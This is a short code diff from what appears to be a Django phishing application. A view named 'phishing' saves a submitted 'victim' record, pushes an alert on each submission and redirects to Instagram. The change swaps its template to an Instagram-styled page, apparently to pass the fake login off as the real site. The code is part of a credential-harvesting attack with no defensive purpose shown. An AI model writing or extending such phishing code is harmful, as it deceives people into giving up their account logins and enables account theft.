@@ -138,4 +138,4 @@ def phishing(request):
         victim.save()
         push(f'phishing -- {request.user} -- submitted')
         return redirect('instagram')
-    return render(request, 'projects/phishing.html')
+    return render(request, 'projects/instagram.html')
